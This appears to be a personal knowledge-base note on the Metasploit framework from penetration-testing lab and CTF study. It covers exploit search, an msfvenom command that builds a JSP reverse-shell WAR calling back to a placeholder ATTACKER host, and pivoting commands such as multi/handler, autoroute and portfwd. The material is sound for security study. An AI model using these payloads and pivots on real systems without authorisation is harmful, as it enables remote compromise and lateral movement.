---
type: tool
category: framework
related: ["[[guided-pentest]]", "[[reverse-shells]]", "[[metasploit-pivoting]]"]
---

# Metasploit

Exploitation framework (`msfconsole`) for searching and running modules.

## Workflow

```sh
searchsploit <service>       # find known exploits
msfconsole
search <module>; use <module>; set RHOSTS ...; exploit
```

- **`msfvenom`** is the standalone payload generator — no console session needed: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war > reverse.war` builds a ready-to-deploy WAR ([[tomcat-manager-war-deploy]]). `LHOST` is *your* IP: [[pn]]'s first build pointed at the target itself and had to be rebuilt.

## Pivoting workflow

See [[metasploit-pivoting]] for the full multi-hop routine. Core commands:

```sh
exploit/multi/handler                         # catch a reverse shell
post/multi/manage/shell_to_meterpreter        # upgrade shell → meterpreter
route add <net> <mask> <session>              # route a new subnet through a session
post/multi/manage/autoroute                   # auto-add routes from the host's interfaces
auxiliary/scanner/portscan/tcp                # port-scan through the pivot
portfwd add -l <local> -p <remote> -r <rhost> # forward a service
```

## Seen in

[[guided-pentest]] (UnrealIRCd backdoor module), [[littlepivoting]] (full pivoting: `route`/`autoroute` + `portfwd` + `shell_to_meterpreter`), [[dark]] (single-hop pivot: `multi/handler` → `ping_sweep` → `portscan/tcp` → two `portfwd` relays), [[pn]] (msfvenom only — `java/jsp_shell_reverse_tcp -f war`, no msfconsole)
